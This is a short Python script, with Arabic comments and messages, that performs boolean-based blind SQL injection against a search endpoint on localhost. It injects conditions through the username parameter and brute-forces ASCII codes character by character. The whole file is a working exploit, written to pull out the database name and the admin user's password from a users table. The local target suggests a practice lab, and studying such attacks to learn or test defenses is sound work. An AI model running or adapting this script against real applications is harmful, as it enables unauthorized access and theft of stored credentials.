import requests

URL = "http://127.0.0.1:5000/search"

def is_true(condition):
    """يسأل الموقع: هل هذا الشرط صحيح؟"""
    payload = f"admin' AND {condition} -- "
    r = requests.get(URL, params={"username": payload})
    return "admin" in r.text

def extract_string(query, length=30):
    """يستخرج نصًا حرفًا حرفًا"""
    result = ""
    for i in range(1, length + 1):
        for char_code in range(32, 127):  # كل الأحرف المطبوعة
            condition = f"ASCII(SUBSTRING(({query}), {i}, 1)) = {char_code}"
            if is_true(condition):
                result += chr(char_code)
                print(f"  ✅ الحرف {i}: {chr(char_code)}")
                break
        else:
            break  # انتهى النص
    return result

if __name__ == "__main__":
    print("🕵️ الاستخراج الأعمى (Boolean-Based)...\n")
    
    # استخراج اسم قاعدة البيانات
    print("📦 اسم قاعدة البيانات:")
    db_name = extract_string("SELECT database()")
    print(f"\n  ✅ النتيجة الكاملة: {db_name}\n")
    
    # استخراج كلمة مرور admin
    print("🔑 كلمة مرور admin:")
    admin_pass = extract_string("SELECT password FROM users WHERE username='admin'")
    print(f"\n  ✅ النتيجة الكاملة: {admin_pass}")